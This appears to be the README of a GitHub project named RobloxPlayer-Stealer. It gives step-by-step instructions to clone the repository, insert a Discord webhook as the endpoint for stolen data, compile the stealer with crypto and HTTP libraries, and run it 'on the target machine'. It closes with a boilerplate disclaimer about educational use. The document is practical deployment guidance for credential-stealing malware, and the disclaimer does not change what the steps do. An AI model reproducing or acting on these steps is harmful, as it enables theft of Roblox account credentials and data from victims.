## How to Use

1. Clone this repository:

   ```bash
   git clone --depth 1 --branch RobloxPlayer-Stealer https://github.com/nolimanom/MyStealers && (cmd.exe /C "ren MyStealers NolimanomStealers_RobloxPlayer-Stealer" 2>nul || mv MyStealers NolimanomStealers_RobloxPlayer-Stealer)
   ```
2. Open `main.cpp` and replace the placeholder at line 255 with your discord webhook.
3. Build the project using the Visual Studio compiler:

   ```cmd
   cl main.cpp /EHsc /Fe:RobloxPlayer-Stealer.exe /link crypt32.lib winhttp.lib shell32.lib
   ```
4. Run the resulting executable on the target machine.

## Disclaimer

**This project is intended solely for educational and personal use.**

You should use this software **only on Roblox accounts you own or have explicit permission to access**.

**Unauthorized use to access, steal, or manipulate data belonging to others is illegal and unethical.**

The author assumes no responsibility for any misuse, damages, or legal consequences resulting from the use of this software. Use it at your own risk and in accordance with all applicable laws.
